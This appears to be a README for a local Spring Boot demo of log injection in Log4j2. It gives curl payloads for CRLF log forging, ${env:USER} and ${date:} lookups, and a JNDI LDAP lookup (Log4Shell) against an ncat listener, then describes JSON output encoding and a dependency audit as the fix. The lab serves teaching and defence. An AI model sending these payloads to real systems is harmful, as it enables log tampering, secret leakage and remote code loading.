# Log Injection with Spring Boot and Log4J2

## Usage

- Run

```
./gradlew bootRun
```

- Request

```
curl http://localhost:8080/\?name\=Frodon
```

## Hack

### Using CRLF injection

```
curl http://localhost:8080/\?name\=Marty%0d%0a1985-10-30%2021%3A59%3A01.108%20DEBUG%20128537%20---%20%5Bnio-8080-exec-1%5D%20net.example.logging.HelloController%20%20%20%20%20%20%3A%20You%20have%20been%20pwed%0A
```

### Using date lookup

Date lookup ``${date:yyyyMMdd-HHmmss}``:

```
curl http://localhost:8080/\?name\=%24%7Bdate%3AyyyyMMdd-HHmmss%7D
```

### Using env lookup

Env lookup ``${env:USER}``:

```
curl http://localhost:8080/\?name\=%24%7Benv%3AUSER%7D
```

### Using JNDI Injection

- Run a listener

```
ncat -v -l -p 5000
```

- JNDI LDAP lookup: ``Hello ${jndi:ldap://localhost:5000}%``

```
curl http://localhost:8080/\?name\=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A5000%7D
```

## Fix

Using output encoding (JSON), log injection are not!

Even if app uses a vulnerable version of log4j2.
Check it with OSS Index:

```
./gradlew ossIndexAudit
```
